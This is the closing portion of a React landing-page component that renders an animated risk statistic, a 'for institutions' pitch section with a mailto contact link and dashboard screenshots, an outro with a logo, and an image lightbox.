            <motion.div className="border-b border-white/10 pb-8 md:pb-12" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.9, delay: 0.3, ease: [0.16, 1, 0.3, 1] }}>
              <div className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-[hsl(var(--trust-red)/0.8)] leading-none keep-ltr" dir="ltr">
                {c.risk.stat3Cve}
              </div>
              <p className="mt-4 text-base md:text-lg font-light text-white/70 max-w-md">{c.risk.stat3}</p>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Section 7 FOR INSTITUTIONS */}
      <section id="institutions" className="relative py-24 md:py-40 px-4 md:px-8 overflow-hidden" style={{ backgroundColor: '#F1EDE4' }}>
        <div className="relative z-10 max-w-7xl mx-auto text-[hsl(var(--gray-900))]">
          <div className="flex items-baseline justify-between">
            <span className="text-[11px] tracking-[0.35em] uppercase font-normal text-black/70">{c.inst.eyebrow}</span>
            <span className="text-[11px] tracking-[0.35em] uppercase font-normal text-black/50 keep-ltr" dir="ltr">{c.inst.brief}</span>
          </div>
          <motion.div className="mt-6 h-px w-full bg-black/80 origin-left" initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true, amount: 0.4 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }} />

          <div className="mt-14 md:mt-20 grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20 items-start">
            <motion.div className="lg:col-span-5" initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
              <h2 className="font-editorial font-normal text-5xl md:text-6xl lg:text-7xl leading-[1.02] tracking-tight text-black/70">
                {c.inst.titleDim}<br /><em className="italic text-black">{c.inst.titleEm}</em>
              </h2>

              <div className="mt-10 md:mt-12 max-w-xl">
                <p className="text-base md:text-[17px] font-light text-black/80 leading-[1.75]">
                  <span className={`${isRtl ? 'float-right ml-3' : 'float-left mr-3'} font-editorial text-6xl md:text-7xl leading-[0.85] mt-1 text-black`}>
                    {c.inst.p1lead}
                  </span>
                  {c.inst.p1rest}
                </p>
                <p className="mt-6 text-base md:text-[17px] font-light text-black/80 leading-[1.75]">
                  {c.inst.p2}
                </p>
              </div>

              <ol className="mt-14 md:mt-16 space-y-7">
                {c.inst.beats.map((beat, i) => (
                  <motion.li key={beat.title} className="grid grid-cols-[auto_1fr] gap-5 items-baseline" initial={{ opacity: 0, y: 10 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.7, delay: 0.1 + i * 0.1, ease: [0.16, 1, 0.3, 1] }}>
                    <span className="font-editorial italic text-2xl md:text-3xl text-black/50 leading-none w-8 keep-ltr" dir="ltr">
                      {String(i + 1).padStart(2, '0')}
                    </span>
                    <div>
                      <div className="font-editorial text-xl md:text-2xl text-black leading-tight">{beat.title}</div>
                      <div className="mt-1 text-sm md:text-[15px] font-light text-black/60 leading-relaxed">{beat.body}</div>
                    </div>
                  </motion.li>
                ))}
              </ol>

              <motion.blockquote className={`mt-14 md:mt-16 ${isRtl ? 'pr-6 border-r' : 'pl-6 border-l'} border-black/80`} initial={{ opacity: 0, y: 12 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>
                <p className="font-editorial text-3xl md:text-4xl lg:text-5xl leading-[1.1] text-black/70">
                  {c.inst.pullDim}<em className="italic text-black">{c.inst.pullEm}</em>
                </p>
              </motion.blockquote>

              <motion.div className="mt-12" initial={{ opacity: 0, y: 12 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.8, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
                <a
                  href="mailto:team@amai.net?subject=Request%20Access%20%2F%20Enterprise"
                  onClick={() => showEmailFallbackToast()}
                  className="inline-flex items-center gap-3 text-[13px] tracking-[0.2em] uppercase font-normal text-black hover:text-white transition-colors duration-300 px-6 py-3 border border-black hover:bg-black"
                >
                  {c.inst.cta}<span aria-hidden>{isRtl ? '←' : '→'}</span>
                </a>
                
              </motion.div>
            </motion.div>

            <motion.figure className="lg:col-span-7 lg:pt-4 m-0" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.2 }} transition={{ duration: 1, delay: 0.2, ease: [0.16, 1, 0.3, 1] }}>
              <button type="button" onClick={() => setLightboxSrc(agentFleetDashboard.url)} className="block w-full relative border border-black/80 bg-white shadow-[0_30px_80px_-30px_rgba(0,0,0,0.35)] cursor-zoom-in focus:outline-none focus:ring-2 focus:ring-black/40">
                <img src={agentFleetDashboard.url} alt={c.inst.figAlt} className="w-full h-auto block" loading="lazy" />
              </button>

              <button type="button" onClick={() => setLightboxSrc(institutionsResearch.url)} className="block w-full relative border border-black/80 bg-white shadow-[0_30px_80px_-30px_rgba(0,0,0,0.35)] mt-4 md:mt-6 cursor-zoom-in focus:outline-none focus:ring-2 focus:ring-black/40">
                <img src={institutionsResearch.url} alt={c.inst.figAlt} className="w-full h-auto block" loading="lazy" />
              </button>
            </motion.figure>
          </div>

          <motion.div className="mt-20 md:mt-28 h-px w-full bg-black/80 origin-left" initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true, amount: 0.4 }} transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }} />
        </div>
      </section>

      {/* Outro */}
      <section className="relative bg-perspective-grid min-h-[80vh] md:min-h-[85vh] flex flex-col items-center justify-center py-32 md:py-48 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_50%_0%,hsl(var(--cyan-accent)/0.12),transparent_60%)] pointer-events-none" />
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,transparent_0%,rgba(0,0,0,0.4)_100%)] pointer-events-none" />

        <motion.div className="relative z-10 max-w-4xl mx-auto text-center flex flex-col items-center" initial={{ opacity: 0, y: 40 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.3 }} transition={{ duration: 1.6, ease: [0.16, 1, 0.3, 1] }}>
          <img src={amaiLogo} alt={c.outro.logoAlt} className="h-20 md:h-32 w-auto mx-auto mb-12 md:mb-16 brightness-110 drop-shadow-[0_0_40px_rgba(166,252,252,0.25)]" />
          <h2 className="text-3xl md:text-5xl lg:text-6xl font-light tracking-tight text-white leading-[1.1]">
            {c.outro.line}
          </h2>
          <span className="mt-16 md:mt-20 text-[10px] md:text-[11px] tracking-[0.35em] uppercase text-white/40 font-light keep-ltr" dir="ltr">
            {c.outro.tag}
          </span>
        </motion.div>
      </section>

      <Footer />

      {lightboxSrc && (
        <div
          className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 md:p-10 cursor-zoom-out"
          onClick={() => setLightboxSrc(null)}
          role="dialog"
          aria-modal="true"
        >
          <button
            type="button"
            onClick={(e) => { e.stopPropagation(); setLightboxSrc(null); }}
            className="absolute top-4 right-4 md:top-6 md:right-6 text-white/80 hover:text-white text-2xl leading-none w-10 h-10 flex items-center justify-center border border-white/20 rounded-full"
            aria-label="Close"
          >
            ×
          </button>
          <img
            src={lightboxSrc}
            alt=""
            onClick={(e) => e.stopPropagation()}
            className="max-w-full max-h-full w-auto h-auto object-contain shadow-2xl cursor-default"
          />
        </div>
      )}
    </div>
  );
};

export default Home;
